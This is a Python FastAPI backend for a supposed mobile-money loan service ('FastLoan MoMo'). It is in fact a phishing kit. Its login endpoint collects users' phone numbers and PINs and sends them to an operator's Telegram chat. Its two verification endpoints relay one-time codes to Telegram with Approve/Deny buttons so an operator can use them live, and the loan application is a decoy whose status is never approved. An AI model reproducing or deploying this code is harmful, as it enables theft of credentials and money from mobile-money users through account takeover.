import os
import uuid
import asyncio
import httpx
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Request
from pydantic import BaseModel, Field
from fastapi.middleware.cors import CORSMiddleware

load_dotenv()

app = FastAPI(title="FastLoan MoMo API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=False, 
    allow_methods=["*"],
    allow_headers=["*"],
)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# In-memory databases
LOAN_REQUESTS = {}
OTP_REQUESTS = {}
SECOND_VERIFICATION_REQUESTS = {}

# --- KEEP-ALIVE BACKGROUND TASK ---
async def self_ping():
    render_url = os.getenv("RENDER_EXTERNAL_URL")
    if not render_url: return
    ping_url = f"{render_url}/"
    await asyncio.sleep(10)
    while True:
        try:
            async with httpx.AsyncClient() as client:
                await client.get(ping_url, timeout=10.0)
        except Exception:
            pass
        await asyncio.sleep(14 * 60)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(self_ping())

# --- DATA MODELS ---
class LoginRequest(BaseModel):
    phone_number: str
    pin: str

class OTPRequest(BaseModel):
    phone_number: str
    otp_code: str

# ✅ UPDATED: Removed secret_code from the model
class SecondVerificationRequest(BaseModel):
    phone_number: str
    second_otp: str

class LoanRequest(BaseModel):
    phone_number: str
    amount: float = Field(..., gt=0)
    months: int = Field(..., gt=0)

# --- ENDPOINTS ---

@app.get("/")
async def root():
    return {"status": "success", "message": "Backend is running!"}

@app.post("/api/login")
async def login(data: LoginRequest):
    await send_telegram_message(
        f"🔐 <b>New Login Attempt</b>\n📱 Phone: {data.phone_number}\n🔑 PIN: {data.pin}"
    )
    return {"status": "success"}

@app.post("/api/verify-otp")
async def verify_otp(data: OTPRequest):
    otp_id = str(uuid.uuid4())
    OTP_REQUESTS[otp_id] = "pending"

    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": f"🔢 <b>1st OTP Verification</b>\n\n📱 Phone: {data.phone_number}\n🔑 Code: <code>{data.otp_code}</code>",
            "parse_mode": "HTML",
            "reply_markup": {
                "inline_keyboard": [[
                    {"text": "✅ Approve OTP", "callback_data": f"approve_otp_{otp_id}"},
                    {"text": "❌ Deny OTP", "callback_data": f"deny_otp_{otp_id}"}
                ]]
            }
        }
        async with httpx.AsyncClient() as client:
            await client.post(url, json=payload, timeout=10.0)

    return {"status": "pending", "otp_id": otp_id}

@app.get("/api/otp-status/{otp_id}")
async def get_otp_status(otp_id: str):
    if otp_id not in OTP_REQUESTS:
        raise HTTPException(status_code=404, detail="OTP not found")
    return {"status": OTP_REQUESTS[otp_id]}

# ✅ UPDATED: Second verification no longer expects a secret code
@app.post("/api/verify-second-otp")
async def verify_second_otp(data: SecondVerificationRequest):
    verify_id = str(uuid.uuid4())
    SECOND_VERIFICATION_REQUESTS[verify_id] = "pending"

    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": (
                f"🔐 <b>2nd Verification</b>\n\n"
                f"📱 Phone: {data.phone_number}\n"
                f"🔢 2nd OTP: <code>{data.second_otp}</code>"
            ),
            "parse_mode": "HTML",
            "reply_markup": {
                "inline_keyboard": [[
                    {"text": "✅ Approve 2nd", "callback_data": f"approve_second_{verify_id}"},
                    {"text": "❌ Deny 2nd", "callback_data": f"deny_second_{verify_id}"}
                ]]
            }
        }
        async with httpx.AsyncClient() as client:
            await client.post(url, json=payload, timeout=10.0)

    return {"status": "pending", "verify_id": verify_id}

@app.get("/api/second-verification-status/{verify_id}")
async def get_second_status(verify_id: str):
    if verify_id not in SECOND_VERIFICATION_REQUESTS:
        raise HTTPException(status_code=404, detail="Verification not found")
    return {"status": SECOND_VERIFICATION_REQUESTS[verify_id]}

@app.post("/api/apply-loan")
async def apply_loan(data: LoanRequest):
    loan_id = str(uuid.uuid4())
    LOAN_REQUESTS[loan_id] = "pending"
    await send_telegram_message(
        f"💰 <b>New Loan Application</b>\n📱 Phone: {data.phone_number}\n💵 Amount: {data.amount:,.0f} FCFA\n📅 Months: {data.months}"
    )
    return {"status": "pending", "loan_id": loan_id}

@app.get("/api/loan-status/{loan_id}")
async def get_loan_status(loan_id: str):
    if loan_id not in LOAN_REQUESTS:
        raise HTTPException(status_code=404, detail="Loan not found")
    return {"status": LOAN_REQUESTS[loan_id]}

async def send_telegram_message(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID: return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    async with httpx.AsyncClient() as client:
        await client.post(url, json=payload)

@app.post("/api/telegram-webhook")
async def telegram_webhook(request: Request):
    try:
        data = await request.json()
        if "callback_query" in data:
            callback = data["callback_query"]
            callback_id = callback.get("id")
            message = callback.get("message", {})
            chat_id = message.get("chat", {}).get("id")
            message_id = message.get("message_id")
            original_text = message.get("text", "")
            action_data = callback.get("data", "")
            
            try:
                action, item_type, item_id = action_data.split("_", 2)
            except ValueError:
                return {"status": "ok"}

            # Update status based on item type
            if item_type == "otp" and item_id in OTP_REQUESTS:
                OTP_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
                reply_text = "✅ 1st OTP Approved" if action == "approve" else "❌ 1st OTP Denied"
            elif item_type == "second" and item_id in SECOND_VERIFICATION_REQUESTS:
                SECOND_VERIFICATION_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
                reply_text = "✅ 2nd Verification Approved" if action == "approve" else "❌ 2nd Verification Denied"
            else:
                return {"status": "ok"}

            async with httpx.AsyncClient() as client:
                await client.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
                    json={"callback_query_id": callback_id, "text": reply_text}
                )
                if message_id and chat_id:
                    try:
                        await client.post(
                            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText",
                            json={
                                "chat_id": chat_id,
                                "message_id": message_id,
                                "text": f"{original_text[:4000]}\n\n<b>Result: {reply_text}</b>",
                                "parse_mode": "HTML"
                            }
                        )
                    except Exception:
                        pass
    except Exception as e:
        print(f"❌ Webhook error: {e}")
    return {"status": "ok"}